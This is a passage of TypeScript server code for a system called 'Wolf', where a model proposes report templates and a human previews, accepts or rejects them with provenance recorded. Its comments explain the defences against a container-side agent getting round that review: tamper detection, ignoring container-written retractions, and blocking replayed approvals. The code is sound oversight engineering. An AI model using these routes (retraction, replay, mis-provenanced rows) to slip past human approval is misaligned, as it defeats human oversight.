    // `substring(content, 1, 500)` and a template fragment routinely runs to
    // tens of kilobytes. A route reading `snippet` would hand a human half a
    // template to approve and pass every other assertion.
    const full = await client.getMemoryById(winner.id);
    const parsed = parseTemplateContent(full.content);
    return {
      record: {
        memoryId: full.id,
        summary: parsed.first,
        html: parsed.html,
        createdAtMs: full.createdAtMs,
        createdByWorker: full.createdByWorker,
        createdBySession: full.createdBySession,
      },
      tamper,
    };
  }

  /**
   * The empty state, carrying what was witnessed.
   *
   * 🔴 `tamper` is in the 404's details and that is the blocking half. "No
   * candidate exists" and "the only candidate was written by something that
   * is not this hypothesis" are different facts, and rendering the second as
   * the first hides an attack behind a benign empty state — the exact failure
   * R185 records for the detail route's `drift: null`.
   */
  function candidateNotFound(id: string, tamper: readonly Tamper[]): WolfError {
    return new WolfError("not_found", `hypothesis ${id} has no report candidate`, {
      details: { id, reason: "no_report_candidate", tamper: [...tamper] },
    });
  }

  /** The session list is the authoritative index of hypotheses, never memory. */
  async function requireKnownHypothesis(id: string): Promise<SessionLookup> {
    const index = await store.readSessionIndex();
    if (!index.has(id)) {
      throw new WolfError("not_found", `no hypothesis ${id}`, { details: { id } });
    }
    return index;
  }

  router.get(
    "/api/hypotheses/:id/report-candidate",
    requireSignedIn,
    (req: Request, res: Response, next) => {
      void (async () => {
        const id = requireHypothesisId(req.params["id"]);
        const sessions = await requireKnownHypothesis(id);
        const { record, tamper } = await readCandidate(id, sessions);
        if (record === null) throw candidateNotFound(id, tamper);

        // A candidate that does not validate is the MODEL'S mistake — not the
        // caller's (so not a 422) and not Wolf's stored state (so not an
        // `internal`). The human is shown what is wrong and the accept button
        // has nothing to post; that is a 200 describing a bad proposal.
        let parsed: ParsedTemplate | null = null;
        let errors: TemplateError[] = [];
        try {
          parsed = validateTemplate(record.html, config.reportMaxBytes);
        } catch (err) {
          if (!(err instanceof WolfError) || err.kind !== "invalid") throw err;
          errors = templateErrorsOf(err);
        }

        logger.info(
          {
            id,
            memory_id: record.memoryId,
            valid: parsed !== null,
            script_srcs: parsed?.scriptSrcs.length ?? 0,
            remote_origins: parsed?.remoteOrigins.length ?? 0,
            tamper: tamper.length,
          },
          "report candidate read",
        );

        const response: ReportCandidateResponse = {
          memory_id: record.memoryId,
          summary: record.summary,
          html: record.html,
          created_at_ms: record.createdAtMs,
          created_by_worker: record.createdByWorker,
          created_by_session: record.createdBySession,
          structure_hash: parsed?.structureHash ?? null,
          script_srcs: parsed?.scriptSrcs ?? [],
          remote_origins: parsed?.remoteOrigins ?? [],
          // 🔴 `frame.ts`'s own derivation, never a second one here. This is
          // the set W19 substitutes into `script-src`, and the screen must not
          // show the human a different answer from the one Wolf enforces.
          code_origins: parsed === null ? [] : codeOrigins(parsed.scriptSrcs),
          valid: parsed !== null,
          errors,
          tamper,
        };
        res.status(200).json(response);
      })().catch(next);
    },
  );

  /**
   * The candidate PREVIEW, as a document.
   *
   * 🔴 **It exists because a CSP is a header, and a header can only apply to a
   * document the browser fetched.** W24's criterion is that the candidate
   * renders inside the real frame component with the real CSP and the real
   * sandbox — "reviewing a preview that differs from production defeats the
   * purpose of reviewing" — and `GET …/report/frame` cannot serve it: that
   * route reads the LOCKED template, and at review time there is none. A
   * `srcdoc` preview would carry no CSP header at all, and a
   * `<meta http-equiv>` copy silently ignores `sandbox` and
   * `frame-ancestors`, which are the two directives that make this document
   * safe.
   *
   * It is the same `composeFrame` call the locked route makes, so the derived
   * policy is derived the same way, from the same bytes the human is about to
   * approve.
   *
   * 🔴 **The slots are EMPTY.** A candidate has never been filled by a tick,
   * and splicing the LOCKED template's slot content into it would show the
   * human yesterday's numbers as though this proposal had produced them. The
   * series payload is real, because a template's chart code reads
   * `window.__WOLF_SERIES__` and a preview drawn from an empty global is not
   * the document that will be served.
   *
   * Deliberately NOT cached: a candidate is previewed by one human, once, and
   * the frame cache is keyed on a locked template's `structureHash`.
   */
  router.get(
    "/api/hypotheses/:id/report-candidate/frame",
    requireSignedIn,
    (req: Request, res: Response, next) => {
      void (async () => {
        const id = requireHypothesisId(req.params["id"]);
        const sessions = await requireKnownHypothesis(id);
        const { record, tamper } = await readCandidate(id, sessions);
        if (record === null) throw candidateNotFound(id, tamper);

        // 422 `invalid`, never `internal`: a model wrote this template, so a
        // rejection is not evidence that Wolf has a bug (§ "Shared error
        // taxonomy"). The same `{path, message}` list the read above carries.
        const parsed = validateSubmittedTemplate(
          record.html,
          config.reportMaxBytes,
          "the proposed report template is not valid, so it cannot be previewed",
        );

        const spec = await readLockedSpec(id, sessions);
        const versions = await readVersions(id, spec);
        const seriesByMetric = await readSeries(id, versions);
        const series =
          spec === undefined ? {} : buildSeriesPayload(spec, seriesByMetric, config.seriesMaxPoints);

        const composed = composeFrame({ template: parsed, slots: {}, series });
        logger.info(
          { id, memory_id: record.memoryId, structure_hash: parsed.structureHash, tamper: tamper.length },
          "report candidate frame composed",
        );
        send(res, composed.html, composed.csp);
      })().catch(next);
    },
  );

  // ── POST /api/hypotheses/:id/report-amendment ─────────────────────────

  /**
   * The proposal row, read BY ID.
   *
   * 🔴 **A direct read, not a scan of one page.** The previous version listed
   * `kind=report-amendment,name=<id>` with `limit: 50` and searched the page,
   * which was sized before decisions shared the kind: with a decision row per
   * decision the page now fills at twice the old rate, and past 50 rows a
   * legitimate `amendment_id` 404s because it fell off the end. Paging that
   * scan would work — `GET /agent/memories` has no `offset`, so it would mean
   * a `until=<cursor>` walk over second-granularity RFC3339 timestamps, on
   * millisecond rows — but the question here is "give me THIS row", and an id
   * read answers it in one request that cannot overflow. It also removes the
   * second request the old path made to fetch the full content.
   *
   * The two label checks are the scoping the selector used to provide, and
   * they are not optional: `GET /agent/memories/{id}` is scoped to the project
   * and to nothing finer, so without them one hypothesis's amendment could be
   * adopted into another's report.
   *
   * ⚠️ One deliberate behaviour change: `GET /agent/memories/{id}` is NOT
   * retraction-filtered (`go/agentdb/memories.go:281-283`), so a proposal that
   * a container retracted is now visible here rather than hidden. That is the
   * safer direction and it matches `readTemplate`'s reasoning — nothing in
   * Wolf retracts an amendment, so any retraction of one came from inside a
   * container, and letting it hide a proposal from a human is exactly the
   * failure the retraction defence exists to prevent.
   */
  async function readProposal(id: string, amendmentId: string): Promise<MemoryRecord> {
    let row: MemoryRecord;
    try {
      row = await client.getMemoryById(amendmentId);
    } catch (err) {
      if (err instanceof WolfError && err.kind === "not_found") {
        throw amendmentNotFound(id, amendmentId);
      }
      throw err;
    }
    if (row.labels["kind"] !== KIND_REPORT_AMENDMENT || row.labels["name"] !== id) {
      // Deliberately the SAME answer as "no such row": this route is not an
      // oracle for what exists elsewhere in the project.
      throw amendmentNotFound(id, amendmentId);
    }
    return row;
  }

  function amendmentNotFound(id: string, amendmentId: string): WolfError {
    return new WolfError(
      "not_found",
      `no report-amendment ${JSON.stringify(amendmentId)} for hypothesis ${id}`,
      { details: { id, amendment_id: amendmentId } },
    );
  }

  /**
   * The decision row for one proposal, if a human has already made one.
   *
   * One exact three-term selector, so it cannot overflow a page the way a
   * scan can. `amendmentId` has already been constrained to the label charset
   * by `amendmentBody`, which is what makes interpolating it into a selector
   * safe (a comma would add a term and make this query match nothing).
   */
  async function findDecision(
    id: string,
    amendmentId: string,
  ): Promise<MemorySearchResultRow | undefined> {
    const rows = await client.listMemories({
      selector: `${reportSelector(KIND_REPORT_AMENDMENT, id)},${AMENDMENT_LABEL}=${amendmentId}`,
      limit: 1,
      // ⚠️ `include_retracted=1`, for the same reason every other read in this
      // codebase carries it: without it Orange filters retracted rows
      // server-side, so a retraction written from INSIDE A CONTAINER would
      // hide the decision and re-open the replay this guard closes. Wolf
      // never retracts a decision, so any retraction of one is untrusted by
      // construction and must not be allowed to erase it.
      includeRetracted: true,
    });
    return rows[0];
  }

  /**
   * Records the HUMAN'S decision, on both paths.
   *
   * Memories are append-only, so deciding is appending: a second
   * `kind=report-amendment` row for the same `name`, `status=accepted` or
   * `status=rejected`, the human's rationale as line 1 and an empty body. The
   * proposal keeps its own row and its own container-side provenance; this row
   * is written with Wolf's credential, so its provenance is empty and it could
   * not have come from inside a container.
   *
   * It exists because the accept path otherwise kept the MODEL's rationale
   * (the proposal) and discarded the HUMAN's, which inverts "agent proposes,
   * human decides, enforced by provenance" (owner ruling 2026-08-26, from this
   * ticket's finding B). `buildReportAmendmentContent` with an empty body is
   * the documented shape — `parseTemplateContent` never throws on one.
   */
  async function writeDecision(
    id: string,
    rationale: string,
    decision: "accept" | "reject",
    amendmentId: string,
  ): Promise<MemoryRecord> {
    return client.appendMemory({
      labels: reportDecisionLabels(id, decision, amendmentId),
      content: buildReportAmendmentContent({ rationale, html: "" }),
      embed: false,
    });
  }

  router.post(
    "/api/hypotheses/:id/report-amendment",
    requireSignedIn,
    (req: Request, res: Response, next) => {
      void (async () => {
        const user = signedInUser(req);
        const id = requireHypothesisId(req.params["id"]);
        const body = parseBody(
          amendmentBody,
          req.body,
          "POST /api/hypotheses/:id/report-amendment",
        );

        const row = await readProposal(id, body.amendment_id);

        // 🔴 Only a PROPOSAL can be decided. A decision is itself a
        // `kind=report-amendment` row (see `writeDecision`), so without this a
        // caller could "accept" a decision row — whose body is empty, which
        // would surface as a 422 about invalid HTML rather than as what it is.
        // `conflict` is the kind: the row exists and its state refuses.
        const status = row.labels["status"];
        if (status !== AMENDMENT_STATUS_PROPOSED) {
          throw new WolfError(
            "conflict",
            `report-amendment ${JSON.stringify(body.amendment_id)} is not a proposal (status ${JSON.stringify(status ?? null)})`,
            { details: { id, amendment_id: body.amendment_id, status: status ?? null } },
          );
        }

        // 🔴 A proposal is decided ONCE. Memories are append-only and nothing
        // edits the proposal's own labels, so "already decided" is a QUERY
        // against the decision rows — which is why the decision carries the
        // proposal's id as a LABEL rather than in its body.
        //
        // Without this a decided proposal can be replayed: accept B, accept C,
        // re-accept B, and the frame serves B's template again with a fresh
        // `status: accepted` row asserting a human chose it. Nothing is
        // forged and no taxonomy rule is broken — a replayed accept simply
        // walks past a review that already superseded it.
        const decided = await findDecision(id, body.amendment_id);
        if (decided !== undefined) {
          // 🔴 The 409 NAMES THE PATH FORWARD, and the case it is for is
          // accept-after-reject: "we rejected this in March, circumstances
          // changed" is legitimate, and an append-only log cannot express
          // un-reject. The answer is a FRESH proposal — new rationale, new
          // provenance, new review — because the model's original reasoning
          // may no longer hold. A human who hits a wall with no signposted
          // exit produces someone "fixing" the guard.
          //
          // The other three orderings block for one reason: a second decision
          // row would record a human deciding twice, which is the same "the
          // log says something that did not happen" failure the pointer label
          // exists to prevent. A reject cannot undo a lock — it writes no
          // template — so allowing reject-after-accept would produce a record
          // implying it did.
          throw new WolfError(
            "conflict",
            `report-amendment ${JSON.stringify(body.amendment_id)} was already decided ` +
              `(${decided.labels["status"] ?? "unknown"}); a decision is final, so propose a new ` +
              `amendment instead`,
            {
              details: {
                id,
                amendment_id: body.amendment_id,
                decided_as: decided.labels["status"] ?? null,
                decided_at_ms: decided.createdAtMs,
                decision_memory_id: decided.id,
                next: "propose a new report-amendment",
              },
            },
          );
        }

        if (body.decision === "reject") {
          // A rejection writes no template — but it DOES write the decision:
          // a rejection's reason is worth exactly as much as an acceptance's,
          // and it is the only record that a human looked at this proposal at
          // all (owner ruling 2026-08-26).
          const decision = await writeDecision(id, body.rationale, "reject", body.amendment_id);
          logger.info(
            {
              id,
              amendment_id: body.amendment_id,
              decision_memory_id: decision.id,
              by: user.email,
            },
            "report amendment rejected",
          );
          const rejected: ReportAmendmentResponse = {
            id,
            amendment_id: body.amendment_id,
            decision: "reject",
            template_memory_id: null,
            structure_hash: null,
            decision_memory_id: decision.id,
          };
          res.status(200).json(rejected);
          return;
        }

        // `readProposal` already read the FULL row, so there is no second
        // request here: the list route would have returned a 500-character
        // snippet and a template is tens of kilobytes.
        const proposal = parseTemplateContent(row.content);

        // 🔴 Nothing is written until the proposal validates. The order is the
        // criterion: a proposal that fails validation is a 422 AND NO TEMPLATE
        // IS WRITTEN, so this call precedes the append and is not wrapped in
        // anything that could swallow it.
        const parsed = validateSubmittedTemplate(
          proposal.html,
          config.reportMaxBytes,
          "the proposed report template is not valid",
        );

        const memory = await client.appendMemory({
          labels: reportTemplateLabels(id),
          content: buildReportTemplateContent({
            structureHash: parsed.structureHash,
            html: parsed.html,
          }),
          embed: false,
        });

        // 🔴 The TEMPLATE first, the decision second, and the order is
        // deliberate because there is no transaction across two appends. If
        // the decision write fails after the template landed, the proposal
        // stays `proposed` and a human can decide it again — recoverable. The
        // other order leaves a row saying a human accepted a template that was
        // never locked, so the report keeps rendering the old one while the
        // record says otherwise. A lie about state is worse than a repeatable
        // action.
        const decision = await writeDecision(id, body.rationale, "accept", body.amendment_id);

        logger.info(
          {
            id,
            amendment_id: body.amendment_id,
            memory_id: memory.id,
            decision_memory_id: decision.id,
            structure_hash: parsed.structureHash,
            by: user.email,
          },
          "report amendment accepted",
        );

        const accepted: ReportAmendmentResponse = {
          id,
          amendment_id: body.amendment_id,
          decision: "accept",
          template_memory_id: memory.id,
          structure_hash: parsed.structureHash,
          decision_memory_id: decision.id,
        };
        res.status(200).json(accepted);
      })().catch(next);
    },
  );

  return { router, composeReportStats };
}
